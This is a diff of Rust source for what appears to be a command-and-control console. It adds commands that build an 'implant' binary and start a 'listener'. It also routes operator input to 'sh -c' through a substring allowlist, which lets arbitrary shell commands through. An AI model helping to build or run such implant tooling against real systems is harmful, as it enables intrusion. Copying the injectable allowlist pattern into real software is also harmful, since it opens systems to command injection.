@@ -3,8 +3,6 @@ use std::io::{self, Write};
 use std::net::{IpAddr, Ipv4Addr, SocketAddr};
 use std::process::{Command};
 use rand::Rng;
-use cargo::ops::{compile, run};
-use cargo::core::{self, Workspace};
 use log::{info, warn, error, debug};
 
 
@@ -57,11 +55,36 @@ fn main() {
             else if current_cmd.eq("pwd")
                 || current_cmd.eq("whoami")
                 || current_cmd.eq("clear")
+                || current_cmd.eq("top")
+                || current_cmd.eq("w")
+                || current_cmd.eq("which")
+                || current_cmd.eq("whereis")
                 || current_cmd.contains("ls")
-                || current_cmd.contains("pwd")
+                //|| current_cmd.contains("mv")
+                //|| current_cmd.contains("cp")
+                //|| current_cmd.contains("cd")
+                //|| current_cmd.contains("mkdir")
+                //|| current_cmd.contains("rmdir")
+                //|| current_cmd.contains("rm")
+                || current_cmd.contains("awk")
+                || current_cmd.contains("grep")
+                || current_cmd.contains("sed")
+                || current_cmd.contains("cat")
+                || current_cmd.contains("dig")
+                || current_cmd.contains("nslookup")
+                || current_cmd.contains("ps")
+                || current_cmd.contains("uname")
+                || current_cmd.contains("man")
                 || current_cmd.contains("ifconfig")
             {
-                Command::new(current_cmd).status().unwrap();
+                let mut base = Command::new("sh");
+                let mut result = base.arg("-c").arg(current_cmd).status().unwrap();
+
+
+
+
+
+
             }
             else if current_cmd.contains("exec") {
                 println!("[+] Executing command");
@@ -175,12 +198,19 @@ fn help(){
 fn create_anchovy() {
     println!("Spongebob there's another anchovy");
 
+    let mut binding = Command::new("sh");
+    let mut result  = binding.arg("-c").arg("cargo build -q --bin implant");
 }
 
 
 // open listener
 fn open_crusty_crab(){
     println!("Opening crusty crab");
+
+    let mut binding = Command::new("sh");
+    let mut result = binding.arg("-c").arg("cargo run --quiet --bin listener");
+
+    result.status().unwrap();
     //let ws = Workspace::current(&Workspace::self);
     //let result = cargo::ops::run(&ws, );
 }
